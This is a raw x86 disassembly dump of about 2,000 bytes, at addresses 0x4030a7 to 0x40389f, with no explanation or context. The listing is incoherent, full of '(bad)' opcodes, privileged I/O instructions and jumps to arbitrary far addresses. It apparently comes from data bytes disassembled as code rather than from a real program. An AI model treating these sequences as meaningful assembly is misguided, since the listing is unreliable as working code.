  4030a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a8:	inc    edi
  4030a9:	push   ebx
  4030aa:	xor    DWORD PTR [edx-0x4d],eax
  4030ad:	jmp    0xa1777bc0
  4030b2:	add    ah,BYTE PTR [eax]
  4030b4:	aam    0xaa
  4030b6:	sbb    eax,0xd4839ca7
  4030bb:	daa    
  4030bc:	sbb    DWORD PTR [edx],0x70bda6e8
  4030c2:	pop    edx
  4030c3:	mov    ebx,0x65021681
  4030c8:	fadd   st,st(7)
  4030ca:	lods   eax,DWORD PTR ds:[esi]
  4030cb:	fsubp  st(0),st
  4030cd:	or     DWORD PTR [ebx+0x43],edx
  4030d0:	clc    
  4030d1:	cmp    al,0x4b
  4030d3:	sub    bl,BYTE PTR [edx-0x76]
  4030d6:	push   0x2
  4030d8:	inc    edi
  4030d9:	out    dx,al
  4030da:	ret    
  4030db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030dc:	arpl   WORD PTR [ebp-0x5b3448e0],dx
  4030e2:	mov    BYTE PTR [ebp+eax*2-0x1186a65e],0x8c
  4030ea:	xchg   ebp,eax
  4030eb:	outs   dx,DWORD PTR ds:[esi]
  4030ec:	adc    esi,DWORD PTR [esi]
  4030ee:	jg     0x403149
  4030f0:	xchg   ecx,eax
  4030f1:	fs aad 0xaa
  4030f4:	pop    es
  4030f5:	mov    cl,0x74
  4030f7:	or     al,0x61
  4030f9:	aaa    
  4030fa:	test   eax,edx
  4030fc:	add    eax,0x83df51f1
  403101:	dec    edi
  403102:	(bad)  
  403103:	fadd   DWORD PTR [edx]
  403105:	(bad)  
  403106:	shr    DWORD PTR [ebx-0x12],1
  403109:	cmp    ah,bh
  40310b:	adc    DWORD PTR ds:0x247be5c,edx
  403111:	jecxz  0x4030ff
  403113:	push   ebx
  403114:	xchg   ebp,eax
  403115:	fidiv  DWORD PTR [ecx+0x31]
  403118:	pop    ss
  403119:	mov    cl,0x39
  40311b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40311c:	mov    eax,ds:0xe1b95d25
  403121:	stos   BYTE PTR es:[edi],al
  403122:	mov    dh,BYTE PTR [edi]
  403124:	pop    edx
  403125:	call   0x687:0x6d01136a
  40312c:	mov    ds:0x6c5d9531,al
  403131:	stos   DWORD PTR es:[edi],eax
  403132:	adc    eax,0xb4b184da
  403137:	dec    edx
  403138:	outs   dx,DWORD PTR ds:[esi]
  403139:	loopne 0x403165
  40313b:	retf   
  40313c:	push   edx
  40313d:	retf   0x24a6
  403140:	(bad)  
  403141:	mov    eax,0x1a9a0807
  403146:	or     ebp,DWORD PTR [ebx]
  403148:	retf   0x3ee0
  40314b:	or     edx,DWORD PTR [eax]
  40314d:	push   DWORD PTR [esi-0x13]
  403150:	pop    ebp
  403151:	loop   0x4031c2
  403153:	and    al,0x59
  403155:	test   DWORD PTR [ebp-0x44554cc9],eax
  40315b:	mov    edi,?
  40315d:	sbb    al,0x7f
  40315f:	mov    al,0x58
  403161:	jne    0x8ed7524f
  403167:	or     eax,0x99453162
  40316c:	push   es
  40316d:	dec    edi
  40316e:	adc    ch,BYTE PTR [eax-0x63]
  403171:	cmp    DWORD PTR [edi+esi*8],ebp
  403174:	into   
  403175:	or     al,0xbd
  403177:	test   eax,0x34e25bee
  40317c:	sbb    al,0x65
  40317e:	cli    
  40317f:	cmp    edx,DWORD PTR [edi]
  403181:	sar    BYTE PTR [ebx*1-0x2c750892],0xd7
  403189:	add    ah,BYTE PTR [ebx-0x2e]
  40318c:	js     0x4031f8
  40318e:	pop    ecx
  40318f:	int    0x75
  403191:	idiv   BYTE PTR [ebx-0x4c]
  403194:	cwde   
  403195:	stos   BYTE PTR es:[edi],al
  403196:	sbb    eax,0xaf42265
  40319b:	fst    QWORD PTR [eax+0x4dd2a244]
  4031a1:	shr    DWORD PTR [eax+eax*2],1
  4031a4:	cmp    eax,0x48638f4
  4031a9:	repnz repz mov ds:0xfd31cd0e,eax
  4031b0:	imul   edi,DWORD PTR [ecx-0x29e99813],0x3a75deff
  4031ba:	xor    DWORD PTR [ebp+0x4],ecx
  4031bd:	pop    eax
  4031be:	js     0x4031f4
  4031c0:	les    edx,FWORD PTR [edx+0x30fcefb8]
  4031c6:	pop    ebp
  4031c7:	ins    BYTE PTR es:[edi],dx
  4031c8:	push   0xa
  4031ca:	retf   0x457a
  4031cd:	inc    eax
  4031ce:	mov    eax,ds:0xb00de6a
  4031d3:	daa    
  4031d4:	xchg   edx,eax
  4031d5:	jae    0x403179
  4031d7:	push   ebx
  4031d8:	xchg   esi,eax
  4031d9:	repnz xor BYTE PTR [eax+0x73],ch
  4031dd:	es call 0xac1bcbc0
  4031e3:	push   0x36aadc2b
  4031e8:	ja     0x4031f3
  4031ea:	pop    edx
  4031eb:	leave  
  4031ec:	repz cmp eax,0x797eebdf
  4031f2:	mov    ds:0xf19e7316,al
  4031f7:	mov    esp,0x242ce606
  4031fc:	jbe    0x4031dd
  4031fe:	xchg   DWORD PTR [esi-0x4b],ebx
  403201:	in     eax,dx
  403202:	outs   dx,BYTE PTR ds:[esi]
  403203:	sbb    BYTE PTR [edx],al
  403205:	(bad)  
  403207:	int    0x4b
  403209:	jns    0x4031ab
  40320b:	add    eax,0x66a7eca7
  403210:	aad    0xbb
  403212:	aad    0xb6
  403214:	inc    edi
  403215:	xchg   esp,eax
  403216:	mov    edi,0x339728d8
  40321b:	into   
  40321c:	and    BYTE PTR [edi+0x1bd177ef],dl
  403222:	gs call 0x1f877274
  403228:	sub    DWORD PTR [esi+ecx*8-0x7c],esp
  40322c:	mov    cl,dl
  40322e:	mov    ebp,0xd33b078e
  403233:	ret    0x8e3b
  403236:	dec    esi
  403237:	mov    WORD PTR [edi],gs
  403239:	ins    BYTE PTR es:[edi],dx
  40323a:	imul   ebx,DWORD PTR [ebx+0x5f],0x19f96a0e
  403241:	push   esp
  403242:	xchg   BYTE PTR ds:0xb7460f56,al
  403248:	stos   BYTE PTR es:[edi],al
  403249:	pop    eax
  40324a:	adc    eax,0xb5321d8f
  40324f:	(bad)  
  403250:	stos   BYTE PTR es:[edi],al
  403251:	enter  0xcd96,0x9c
  403255:	fwait
  403256:	rol    BYTE PTR [ebx-0x76],1
  403259:	or     ah,bl
  40325b:	and    eax,0x2cd47745
  403260:	inc    ebp
  403261:	push   esi
  403262:	and    eax,0x5c94a09e
  403267:	arpl   WORD PTR [edi],si
  403269:	mov    esi,0xd6d58145
  40326e:	xchg   edi,eax
  40326f:	lea    esi,[eax+edi*4]
  403272:	inc    edi
  403273:	test   BYTE PTR [esi],0xe
  403276:	in     al,dx
  403277:	mov    ebx,0xc473a9fb
  40327c:	retf   
  40327d:	stos   DWORD PTR es:[edi],eax
  40327e:	aam    0xbd
  403280:	inc    edx
  403281:	mov    esi,0x28e15686
  403286:	ror    DWORD PTR [esi-0x4a9f14cd],cl
  40328c:	inc    esi
  40328d:	cmp    al,0xc6
  40328f:	ret    0x937a
  403292:	rcl    DWORD PTR [ebx-0x31961772],0x3b
  403299:	jge    0x4032e6
  40329b:	push   eax
  40329c:	pop    ds
  40329d:	fcmovne st,st(3)
  40329f:	sub    BYTE PTR [edx+0x2f67c2c],ch
  4032a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a6:	pusha  
  4032a7:	fsubr  QWORD PTR [edx]
  4032a9:	jle    0x4032ea
  4032ab:	push   ebx
  4032ac:	test   edx,edx
  4032ae:	cmp    ebx,DWORD PTR [ecx+0x28a0b677]
  4032b4:	shl    DWORD PTR [edi+0x44],cl
  4032b7:	mov    ah,0x53
  4032b9:	pushw  0x2b52
  4032bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032be:	fldcw  WORD PTR [ebx-0x4b2438a8]
  4032c4:	cmp    BYTE PTR [esi],ch
  4032c6:	pop    edi
  4032c7:	jne    0x403291
  4032c9:	std    
  4032ca:	sub    DWORD PTR ds:0x9596ec46,esp
  4032d0:	addr16 jo 0x403295
  4032d3:	xor    eax,ebp
  4032d5:	enterw 0x5ea6,0xb8
  4032da:	out    dx,eax
  4032db:	lods   al,BYTE PTR ds:[esi]
  4032dc:	fisubr DWORD PTR [esi]
  4032de:	and    ch,BYTE PTR [edx]
  4032e0:	xor    al,0x6d
  4032e2:	sub    bh,bl
  4032e4:	out    dx,eax
  4032e5:	fld    DWORD PTR [edi]
  4032e7:	fwait
  4032e8:	mov    cl,0x25
  4032ea:	jmp    0x1b85cfa1
  4032ef:	nop
  4032f0:	leave  
  4032f1:	stos   DWORD PTR es:[edi],eax
  4032f2:	mov    al,ds:0xc3919999
  4032f7:	icebp  
  4032f8:	push   eax
  4032f9:	pop    ebp
  4032fa:	in     eax,0x57
  4032fc:	sbb    bh,BYTE PTR [eax-0x5e]
  4032ff:	cld    
  403300:	enter  0x49c0,0xc0
  403304:	sbb    edi,esp
  403306:	in     al,0xae
  403308:	mov    dh,0xef
  40330a:	mov    ebx,ds
  40330c:	or     ch,dh
  40330e:	stc    
  40330f:	jecxz  0x40335d
  403311:	dec    ecx
  403312:	push   ebp
  403313:	adc    al,BYTE PTR [edx-0x48300931]
  403319:	retf   0x8819
  40331c:	fnstenv [ebp+0x19]
  40331f:	imul   ebp,DWORD PTR [eax-0x7f],0x985cc305
  403326:	and    DWORD PTR [ebx+0x6d77b711],esp
  40332c:	sahf   
  40332d:	sub    ch,BYTE PTR [edx-0xd18fbce]
  403333:	pop    edi
  403334:	pop    edi
  403335:	in     al,0xd2
  403337:	and    edi,DWORD PTR [ebp+0x9c01a5a]
  40333d:	ins    BYTE PTR es:[edi],dx
  40333e:	fist   DWORD PTR [eax-0x6c]
  403341:	lahf   
  403342:	cdq    
  403343:	loop   0x40339c
  403345:	add    DWORD PTR [ebx],0xffffffde
  403348:	out    0xe5,eax
  40334a:	pop    ebx
  40334b:	or     DWORD PTR [ecx],ecx
  40334d:	mov    ds:0x14355735,eax
  403352:	retf   0xc9f
  403355:	sub    eax,0xd45770fd
  40335a:	lods   eax,DWORD PTR ds:[esi]
  40335b:	mov    edi,0xe2d7eb07
  403360:	or     al,0x97
  403362:	cs leave 
  403364:	jo     0x4033c7
  403366:	aam    0x4
  403368:	push   es
  403369:	xchg   BYTE PTR [esi+0x49],cl
  40336c:	xor    al,0xa0
  40336e:	xchg   esp,eax
  40336f:	test   al,0x45
  403371:	scas   al,BYTE PTR es:[edi]
  403372:	mov    bl,0xe4
  403374:	scas   al,BYTE PTR es:[edi]
  403375:	fist   WORD PTR [edi-0x673b3c87]
  40337b:	fs inc ebp
  40337d:	mov    bl,dl
  40337f:	inc    edi
  403380:	sbb    DWORD PTR [ebp+0x7f],edx
  403383:	dec    edi
  403384:	mov    BYTE PTR [eax+0x6eede4f9],ah
  40338a:	dec    ebx
  40338b:	iret   
  40338c:	mov    bh,0xb9
  40338e:	iret   
  40338f:	shl    DWORD PTR [ebx],0xbc
  403392:	lods   al,BYTE PTR ds:[esi]
  403393:	sub    DWORD PTR [ebp-0x7],ecx
  403396:	(bad)  
  403397:	push   0x2b710905
  40339c:	ret    
  40339d:	adc    al,0xeb
  40339f:	daa    
  4033a0:	iret   
  4033a1:	dec    ebx
  4033a2:	in     al,0xdf
  4033a4:	mov    dh,0xd0
  4033a6:	cmp    esp,DWORD PTR [edi+edi*8-0x8d1d6a9]
  4033ad:	pop    es
  4033ae:	mov    dh,0xae
  4033b0:	sub    dh,dh
  4033b2:	repz idiv DWORD PTR [ebp+eiz*8+0x4e]
  4033b7:	xchg   ecx,edx
  4033b9:	sub    al,0x59
  4033bb:	scas   eax,DWORD PTR es:[edi]
  4033bc:	in     eax,dx
  4033bd:	jae    0x40342b
  4033bf:	xchg   ecx,eax
  4033c0:	ss mov ebx,0x31a007aa
  4033c6:	test   DWORD PTR gs:[eax],ebp
  4033c9:	stc    
  4033ca:	adc    dh,BYTE PTR [eax-0x33]
  4033cd:	arpl   WORD PTR [esi],ax
  4033cf:	in     al,dx
  4033d0:	mov    dl,0x7e
  4033d2:	enter  0xc944,0x17
  4033d6:	pop    ds
  4033d7:	xchg   ebp,eax
  4033d8:	sbb    BYTE PTR [ecx],ah
  4033da:	dec    eax
  4033db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033dc:	test   BYTE PTR [eax-0x67d330f9],dh
  4033e2:	in     al,dx
  4033e3:	jge    0x4033f1
  4033e5:	imul   BYTE PTR [ebx-0x493b4f92]
  4033eb:	xor    BYTE PTR [eax-0x16],bl
  4033ee:	mov    esp,0x9259d1bb
  4033f3:	sub    DWORD PTR [edi+ebx*8],edx
  4033f6:	fidivr WORD PTR [ebx]
  4033f8:	test   esi,ecx
  4033fa:	sub    DWORD PTR [eax+0x47],0x3c
  4033fe:	(bad)  
  4033ff:	out    dx,al
  403400:	jl     0x4033d4
  403402:	jg     0x40342d
  403404:	xlat   BYTE PTR ds:[ebx]
  403405:	repz fbld TBYTE PTR [ebp+0x45]
  403409:	push   eax
  40340a:	aaa    
  40340b:	pop    ds
  40340c:	lea    eax,[esi+0x6ea56f20]
  403412:	cwde   
  403413:	adc    cl,dl
  403415:	cdq    
  403416:	(bad)  
  403417:	jne    0x40342b
  403419:	call   0xfad6431c
  40341e:	xor    dh,0x7a
  403421:	and    al,0x5b
  403423:	mov    BYTE PTR [ecx],bl
  403425:	jno    0x4034a6
  403427:	ret    
  403428:	dec    eax
  403429:	mov    dh,0x51
  40342b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342c:	add    BYTE PTR [edi+0x6f2b8165],bl
  403432:	pop    ecx
  403433:	xor    BYTE PTR [edx+ecx*1],ch
  403436:	cmp    BYTE PTR [ebp+0x4c],bh
  403439:	and    eax,0xba7a3df4
  40343e:	popfw  
  403440:	inc    ebx
  403441:	cli    
  403442:	test   BYTE PTR [ebp+0x31],ch
  403445:	imul   edi,DWORD PTR [edx+0x1ff84987],0xf409e567
  40344f:	es aad 0xa4
  403452:	adc    eax,0x6a502957
  403457:	cli    
  403458:	inc    ebp
  403459:	dec    ecx
  40345a:	sti    
  40345b:	leave  
  40345c:	jns    0x4033eb
  40345e:	push   es
  40345f:	lahf   
  403460:	mov    ebx,0xcb6f9109
  403465:	cmp    al,0xb2
  403467:	xor    BYTE PTR [esi-0x11],0x3f
  40346b:	push   ss
  40346c:	pusha  
  40346d:	icebp  
  40346e:	add    bl,BYTE PTR [ecx]
  403470:	push   eax
  403471:	fmul   QWORD PTR [eax+0x65022688]
  403477:	dec    esp
  403478:	jmp    0x3318:0x35321ad9
  40347f:	add    bh,BYTE PTR [ebx-0x56]
  403482:	ja     0x403445
  403484:	ins    DWORD PTR es:[edi],dx
  403485:	(bad)  
  403486:	in     al,0x56
  403488:	je     0x4034c6
  40348a:	ins    DWORD PTR es:[edi],dx
  40348b:	adc    eax,0x5d07704b
  403490:	stc    
  403491:	hlt    
  403492:	les    esp,FWORD PTR [edx+0x3523b697]
  403498:	push   edi
  403499:	inc    ebp
  40349a:	push   ds
  40349b:	pop    esi
  40349c:	into   
  40349d:	into   
  40349e:	cwde   
  40349f:	xchg   ecx,eax
  4034a0:	sbb    DWORD PTR [eax-0x1e3d46fd],0x415aac54
  4034aa:	jno    0x403491
  4034ac:	push   0xb0c0138
  4034b1:	fist   WORD PTR [edi+edx*1-0x3f]
  4034b5:	(bad)  
  4034b7:	push   cs
  4034b8:	dec    esp
  4034b9:	cli    
  4034ba:	adc    esi,DWORD PTR [esi-0x1ccd53ec]
  4034c0:	mov    ebp,DWORD PTR [eax]
  4034c2:	test   BYTE PTR ds:0x2037a7e1,0x34
  4034c9:	inc    ebx
  4034ca:	jns    0x4034e2
  4034cc:	daa    
  4034cd:	inc    edi
  4034ce:	jg     0x403466
  4034d0:	adc    dl,BYTE PTR [esi+0x57]
  4034d3:	cmp    esp,DWORD PTR [edx]
  4034d5:	xchg   ecx,eax
  4034d6:	out    dx,eax
  4034d7:	mov    edx,0xec5a3ad6
  4034dc:	scas   eax,DWORD PTR es:[edi]
  4034dd:	lods   eax,DWORD PTR ds:[esi]
  4034de:	pop    eax
  4034df:	or     BYTE PTR [eax+0x25],0x2e
  4034e3:	mov    eax,ds:0x977e4115
  4034e8:	mov    ecx,0xac10f737
  4034ed:	sti    
  4034ee:	and    BYTE PTR [esi],al
  4034f0:	inc    edx
  4034f1:	sub    eax,0xa8f89eb8
  4034f6:	jp     0x4034be
  4034f8:	dec    edi
  4034f9:	and    ebp,esi
  4034fb:	cmp    ecx,DWORD PTR [ebx+0xb4b264a]
  403501:	pop    esp
  403502:	mov    edx,0x4dc93317
  403507:	imul   edi,DWORD PTR [esi],0x20
  40350a:	imul   edx,esi,0xffffffac
  40350d:	gs mov bh,0xa6
  403510:	fisub  DWORD PTR [ecx+0x484b67fc]
  403516:	jns    0x40352d
  403518:	loop   0x4034bc
  40351a:	mov    edx,0x5c5bc952
  40351f:	xchg   edi,eax
  403520:	stos   BYTE PTR es:[edi],al
  403521:	inc    ebp
  403522:	scas   eax,DWORD PTR es:[edi]
  403523:	jae    0x403586
  403525:	fst    QWORD PTR [ebp-0x491b3dce]
  40352b:	xor    ah,ah
  40352d:	ret    
  40352e:	shr    BYTE PTR [ecx-0x2e622022],0x29
  403535:	popa   
  403536:	jne    0x4034ca
  403538:	add    ebp,ebx
  40353a:	js     0x403508
  40353c:	mov    ds:0x8c640432,al
  403541:	cdq    
  403542:	mov    dl,0x15
  403544:	dec    eax
  403545:	sub    al,0xd8
  403547:	call   0xc169ffd0
  40354c:	xchg   ebx,eax
  40354d:	inc    ebx
  40354e:	shr    DWORD PTR [ebx+0x56],1
  403551:	push   eax
  403552:	jae    0x40350b
  403554:	xchg   esi,eax
  403555:	mov    ah,BYTE PTR ds:0x84b911ac
  40355c:	inc    ecx
  40355d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40355e:	dec    edx
  40355f:	pop    esp
  403560:	sub    DWORD PTR [ebx-0x2e],ebx
  403563:	lods   eax,DWORD PTR ds:[esi]
  403564:	loopne 0x403539
  403566:	sbb    BYTE PTR [ebx+ecx*8],0xc0
  40356a:	jbe    0x4035a3
  40356c:	push   esp
  40356d:	in     al,dx
  40356e:	and    edi,DWORD PTR [edx+0x48]
  403571:	xor    dl,al
  403573:	cmp    BYTE PTR [esi+0x46],bl
  403576:	imul   esp,DWORD PTR [ebx+0x3760f1ab],0x35
  40357d:	xchg   ebp,eax
  40357e:	mov    al,0x66
  403580:	xor    DWORD PTR [edx],ebp
  403582:	data16 sti 
  403584:	aam    0x47
  403586:	gs push edi
  403588:	nop
  403589:	mov    ebp,0x86f255d4
  40358e:	in     eax,0xea
  403590:	(bad)  
  403591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403592:	xchg   ecx,eax
  403593:	push   cs
  403594:	push   edx
  403595:	mov    edx,0x817e1a47
  40359a:	test   al,0xcb
  40359c:	dec    ecx
  40359d:	fs int3 
  40359f:	jno    0x403559
  4035a1:	or     bh,BYTE PTR [ecx]
  4035a3:	fnsave [esi]
  4035a5:	shr    BYTE PTR [esi+0x5113b8d1],1
  4035ab:	imul   eax,DWORD PTR [ecx-0x6cf52739],0xd08c0d79
  4035b5:	retf   0x3d6d
  4035b8:	mov    dh,0xd5
  4035ba:	and    bl,0xad
  4035bd:	jp     0x4035ba
  4035bf:	test   al,0xc4
  4035c1:	cmp    BYTE PTR [edi-0x71122387],dl
  4035c7:	xchg   edx,eax
  4035c8:	xor    eax,DWORD PTR [ecx+0x3]
  4035cb:	lods   eax,DWORD PTR ds:[esi]
  4035cc:	pop    eax
  4035cd:	pop    esp
  4035ce:	mov    DWORD PTR [ecx-0x1d7d6f4c],ebp
  4035d4:	adc    ah,ch
  4035d6:	push   ebx
  4035d7:	jb     0x403597
  4035d9:	fdivr  DWORD PTR [eax-0x9]
  4035dc:	in     al,0xb6
  4035de:	push   ecx
  4035df:	mov    edx,0xd302cff
  4035e4:	test   esi,eax
  4035e6:	or     eax,0x301c5f01
  4035eb:	mov    bl,0xb0
  4035ed:	(bad)  
  4035ee:	shr    DWORD PTR gs:[ebx],1
  4035f1:	xchg   esp,eax
  4035f2:	add    cl,al
  4035f4:	jmp    0x403c:0x591a6883
  4035fb:	outs   dx,BYTE PTR ds:[esi]
  4035fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035fd:	cdq    
  4035fe:	outs   dx,BYTE PTR ds:[esi]
  4035ff:	js     0x40359c
  403601:	mov    al,ds:0xac1cdd96
  403606:	(bad)  [ebp-0x66]
  403609:	xor    DWORD PTR [eax],ebx
  40360b:	xor    al,0x4e
  40360d:	mov    BYTE PTR [ebp-0x110c55b2],ah
  403613:	lds    edi,FWORD PTR [ecx-0x73]
  403616:	popa   
  403617:	cs xchg BYTE PTR ds:[esi],dl
  40361b:	fisubr DWORD PTR [ebx+0x724785fa]
  403621:	imul   ecx,DWORD PTR [edi-0x45],0x60
  403625:	xor    eax,0xe0a2dbc5
  40362a:	jg     0x403674
  40362c:	push   es
  40362d:	pop    edi
  40362e:	add    eax,0xfd935875
  403633:	aad    0x76
  403635:	and    al,0x22
  403637:	data16 (bad) 
  40363a:	call   0x4fa4:0x61371df7
  403641:	cmp    BYTE PTR [ecx-0x1d],dl
  403644:	push   esi
  403645:	ins    BYTE PTR es:[edi],dx
  403646:	push   0xf76fdad
  40364b:	pop    eax
  40364c:	jnp    0x403665
  40364e:	add    eax,0xc70b3012
  403653:	inc    esi
  403654:	xchg   BYTE PTR [esi+ebp*1+0x3a0c5360],dl
  40365b:	sub    ch,bl
  40365d:	ret    
  40365e:	jge    0x4035e2
  403660:	es hlt 
  403662:	pop    ecx
  403663:	in     al,0x4f
  403665:	or     ebx,DWORD PTR [edi+0x5d]
  403668:	punpckhwd mm0,QWORD PTR [ecx-0x3]
  40366c:	jmp    0xe0698f28
  403671:	lock sub bh,BYTE PTR ds:0xcd9a49c7
  403678:	pop    esp
  403679:	add    al,0x87
  40367b:	sub    eax,0xbfee77b2
  403680:	mov    eax,0x3f03d822
  403685:	stc    
  403686:	and    DWORD PTR [edi-0x5d2cb6ce],edx
  40368c:	jle    0x403622
  40368e:	and    al,0x22
  403690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403691:	xor    cl,BYTE PTR [edx+ebp*1-0xd2910bc]
  403698:	dec    edi
  403699:	mov    ebp,0x4c50b7fa
  40369e:	div    cl
  4036a0:	in     al,0x8b
  4036a2:	and    DWORD PTR [esi],0xffffffe7
  4036a5:	sbb    BYTE PTR ds:0x4e316561,cl
  4036ab:	xor    eax,0xf333040e
  4036b0:	arpl   WORD PTR [ebp-0x3b],ax
  4036b3:	xchg   ebx,eax
  4036b4:	fnsave [esi]
  4036b6:	xor    DWORD PTR [edx],eax
  4036b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b9:	jne    0x4036b9
  4036bb:	lahf   
  4036bc:	cmp    al,0x3d
  4036be:	iret   
  4036bf:	lods   al,BYTE PTR ds:[esi]
  4036c0:	mov    ah,0x9f
  4036c2:	inc    esp
  4036c3:	mov    esi,0x46c44184
  4036c8:	and    ah,ah
  4036ca:	nop
  4036cb:	xchg   ebp,eax
  4036cc:	mov    al,0xac
  4036ce:	sbb    ch,BYTE PTR ds:0xdafd9bce
  4036d4:	xchg   ebx,eax
  4036d5:	sub    DWORD PTR [ecx-0x5e800dc2],eax
  4036db:	inc    ebx
  4036dc:	mov    cs,WORD PTR [edi+0x6573112]
  4036e2:	sbb    eax,0xa0b15fa4
  4036e7:	lock fnstcw WORD PTR [eax-0x1fe33f58]
  4036ee:	push   0xa3111822
  4036f3:	or     esp,DWORD PTR [esi+0x46bbba81]
  4036f9:	adc    ecx,DWORD PTR [ecx+0x3e]
  4036fc:	ins    DWORD PTR es:[edi],dx
  4036fd:	xor    DWORD PTR [edx+ebp*2],edx
  403700:	(bad)  
  403702:	fdivrp st(4),st
  403704:	sbb    eax,0xfd921b1d
  403709:	inc    edi
  40370a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40370b:	nop
  40370c:	aaa    
  40370d:	pop    es
  40370e:	dec    eax
  40370f:	push   0xfffffffd
  403711:	push   ebp
  403712:	pop    edi
  403713:	inc    eax
  403714:	repz sahf 
  403716:	adc    eax,0x1a3d8f4
  40371b:	sub    BYTE PTR [edx+eiz*1],0x0
  40371f:	jmp    0x8879:0x9aeb15b3
  403726:	push   cs
  403727:	jg     0x4036db
  403729:	inc    esp
  40372a:	adc    eax,0x2ed3d88
  40372f:	xchg   esi,esp
  403731:	(bad)  
  403732:	into   
  403733:	aaa    
  403734:	xchg   edi,ebx
  403736:	mov    edi,0x2b248939
  40373b:	sub    BYTE PTR [edi-0x10],bl
  40373e:	and    BYTE PTR [edi+0x3917be4e],dl
  403744:	mov    DWORD PTR [ebx],eax
  403746:	push   0xaee3a9d7
  40374b:	fild   WORD PTR [ebx-0x5]
  40374e:	push   esp
  40374f:	dec    eax
  403750:	mov    bl,0xfc
  403752:	and    BYTE PTR [ebp-0xdb576e5],al
  403758:	push   ecx
  403759:	mov    BYTE PTR [ecx],dl
  40375b:	ins    BYTE PTR es:[edi],dx
  40375c:	push   ebx
  40375d:	aam    0x38
  40375f:	retf   0xaf0f
  403762:	sub    ah,BYTE PTR [edx+0x68cf3276]
  403768:	call   0x30532c52
  40376d:	rol    dh,0x3e
  403770:	xor    esi,DWORD PTR [edx+ebp*8+0x55]
  403774:	jmp    0x403752
  403776:	stc    
  403777:	(bad)  
  403778:	call   0x95ffc972
  40377d:	rcr    DWORD PTR [esi+0x6ea128f3],1
  403783:	mov    esi,0x7a269770
  403788:	std    
  403789:	call   0xe2aabebd
  40378e:	xor    dh,BYTE PTR [ecx-0x43]
  403791:	and    BYTE PTR [edx],bl
  403793:	mov    ebp,0x39598203
  403798:	push   ss
  403799:	or     BYTE PTR [esi+esi*4+0x742e3769],ah
  4037a0:	fnstsw WORD PTR [esi+0x5cad489d]
  4037a6:	ins    DWORD PTR es:[edi],dx
  4037a7:	fs (bad) 
  4037aa:	mul    esp
  4037ac:	push   cs
  4037ad:	sbb    eax,0xaefbe8fd
  4037b2:	scas   eax,DWORD PTR es:[edi]
  4037b3:	(bad)  
  4037b4:	jmp    0x5072ff62
  4037b9:	mov    esi,0xe91f977
  4037be:	das    
  4037bf:	shr    BYTE PTR [edi+0x20e25270],1
  4037c5:	pop    ss
  4037c6:	mov    ds:0xc3de357e,al
  4037cb:	adc    eax,0x64edabb3
  4037d0:	pop    esp
  4037d1:	stc    
  4037d2:	inc    eax
  4037d3:	sbb    eax,0x78cba6a3
  4037d8:	dec    esi
  4037d9:	ds mov cl,al
  4037dc:	scas   eax,DWORD PTR es:[edi]
  4037dd:	ds std 
  4037df:	mov    BYTE PTR [eax+ebp*8+0x12fb7581],ah
  4037e6:	sub    bh,BYTE PTR [edi]
  4037e8:	push   esi
  4037e9:	or     ebx,ecx
  4037eb:	js     0x403773
  4037ed:	sbb    eax,DWORD PTR [ecx-0x545ce4eb]
  4037f3:	and    dl,BYTE PTR [edi]
  4037f5:	sbb    ecx,DWORD PTR [edi-0x18]
  4037f8:	sub    ebp,DWORD PTR [esi-0x75]
  4037fb:	mul    DWORD PTR [ebx]
  4037fd:	push   edx
  4037fe:	rcl    DWORD PTR [edi+0x52],1
  403801:	xchg   ebp,eax
  403802:	mov    dh,bl
  403804:	jmp    0x3fb7:0xc7717150
  40380b:	aaa    
  40380c:	xor    BYTE PTR [esi+0x3feedca],ah
  403812:	dec    ebp
  403813:	pop    ds
  403814:	out    dx,eax
  403815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403816:	aaa    
  403817:	jae    0x4037c1
  403819:	out    0x9e,al
  40381b:	mov    esi,0x53061a6e
  403820:	dec    ebx
  403821:	mov    esp,eax
  403823:	(bad)  
  403824:	clc    
  403825:	lods   eax,DWORD PTR ds:[esi]
  403826:	mov    ah,0x65
  403828:	mov    esp,0x1adffc05
  40382d:	fidiv  WORD PTR [ecx-0x1dfb082a]
  403833:	cld    
  403834:	jnp    0x4037c2
  403836:	sub    BYTE PTR [ecx],ah
  403838:	sub    al,0xd8
  40383a:	cld    
  40383b:	mov    al,ds:0x17e65afd
  403840:	and    al,0xee
  403843:	aaa    
  403844:	(bad)  
  403845:	int3   
  403846:	test   esp,ebx
  403848:	(bad)  
  403849:	popf   
  40384a:	out    dx,eax
  40384b:	xchg   ebx,eax
  40384c:	dec    esp
  40384d:	(bad)  
  40384f:	jecxz  0x40381b
  403851:	(bad)  
  403852:	mov    eax,0xf995fe3c
  403857:	push   0x1
  403859:	jbe    0x4038d1
  40385b:	in     eax,dx
  40385c:	clc    
  40385d:	(bad)  
  40385e:	xchg   esp,eax
  40385f:	(bad)  
  403860:	mov    ch,0xf0
  403862:	mov    dh,0x43
  403864:	inc    eax
  403865:	add    eax,0x2ff43f7e
  40386a:	and    BYTE PTR [eax-0x2],dl
  40386d:	dec    edx
  40386e:	out    dx,eax
  40386f:	fnstenv [edi+ecx*4-0x13]
  403873:	add    al,0xc3
  403875:	ja     0x4038d5
  403877:	inc    eax
  403878:	mov    bh,0xc1
  40387a:	xor    BYTE PTR [eax-0x80],cl
  40387d:	lock cmp edx,DWORD PTR [edi]
  403880:	fxam   
  403882:	ror    bl,0x9c
  403885:	pop    esi
  403886:	adc    DWORD PTR [ecx],0x2564e39c
  40388c:	push   ss
  40388d:	gs pop es
  40388f:	pop    es
  403890:	fs test dl,cl
  403893:	push   cs
  403894:	inc    ebx
  403895:	psllw  mm7,QWORD PTR [eax-0x3f4ba643]
  40389c:	pushf  
  40389d:	icebp  
  40389e:	pop    edx
  40389f:	jb     0x403860
